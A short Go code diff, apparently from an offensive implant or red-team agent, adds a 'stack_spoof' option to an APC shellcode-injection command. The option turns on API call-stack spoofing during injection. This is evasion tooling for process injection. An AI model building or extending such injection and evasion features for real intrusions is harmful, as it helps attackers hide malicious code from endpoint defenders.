@@ -64,7 +64,8 @@ type ApcInjectionParams struct {
 	TimeoutMs uint32 `json:"timeout_ms"`
 	// HwbpDebug enables verbose tracing of the HWBP debug-event loop and
 	// per-thread DR0/DR7 readback after arming. Off by default.
-	HwbpDebug bool `json:"hwbp_debug"`
+	HwbpDebug  bool `json:"hwbp_debug"`
+	StackSpoof bool `json:"stack_spoof"`
 }
 
 func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
@@ -111,6 +112,11 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	if len(shellcode) == 0 {
 		return errorResult("Error: Shellcode data is empty")
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	switch method {
